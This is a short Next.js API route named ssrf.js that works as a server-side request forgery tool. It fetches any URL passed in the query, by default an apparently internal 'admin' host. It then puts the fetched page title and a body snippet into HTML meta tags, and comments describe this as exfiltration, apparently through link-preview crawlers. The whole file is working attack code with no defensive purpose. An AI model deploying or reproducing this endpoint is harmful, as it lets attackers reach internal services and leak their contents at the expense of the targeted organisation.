// pages/api/ssrf.js

export default async function handler(req, res) {
  const target = req.query.url || 'http://admin.bumba.global';

  try {
    const response = await fetch(target, {
      method: 'GET',
      redirect: 'follow',
      headers: {
        'User-Agent': 'Mozilla/5.0 (SSRF-Scanner)'
      }
    });

    const body = await response.text();

    // Try to extract some data to exfiltrate
    const titleMatch = body.match(/<title>(.*?)<\/title>/i);
    const bodyMatch = body.match(/<body[^>]*>([\s\S]*?)<\/body>/i);

    const title = titleMatch ? titleMatch[1].trim() : 'No Title Found';
    const snippet = bodyMatch ? bodyMatch[1].replace(/<[^>]*>?/gm, '').slice(0, 150).trim() : 'No body content';

    // Construct exfiltration in metadata
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <title>SSRF: ${title}</title>
          <meta name="description" content="Snippet: ${snippet}">
          <meta property="image" content="${target}/favicon.ico">
        </head>
        <body>
          <h1>SSRF Metadata Exfiltration</h1>
          <p>Target: ${target}</p>
          <pre>${snippet}</pre>
        </body>
      </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);

  } catch (err) {
    console.error('❌ SSRF fetch failed:', err);
    res.status(200).send(`
      <html>
        <head>
          <title>SSRF Error</title>
          <meta name="description" content="Failed to fetch: ${target}">
          <meta property="image" content="https://http.cat/500">
        </head>
        <body>
          <h1>SSRF Error</h1>
          <pre>${err.toString()}</pre>
        </body>
      </html>
    `);
  }
}
